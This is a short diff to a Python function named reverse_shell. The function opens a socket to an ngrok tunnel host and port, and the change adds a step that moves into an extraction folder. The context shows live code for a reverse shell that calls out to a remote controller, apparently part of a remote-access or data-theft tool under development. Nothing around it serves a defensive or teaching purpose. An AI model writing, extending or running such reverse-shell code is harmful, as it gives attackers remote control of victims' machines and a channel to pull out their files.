@@ -491,6 +491,8 @@ def reverse_shell():
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(10)  # ← Timeout to prevent hanging on recv
             s.connect((NGROK_HOST, NGROK_PORT))
+            os.chdir(EXTRACT_FOLDER)
+
 
             def send_data(data):
                 if not isinstance(data, bytes):
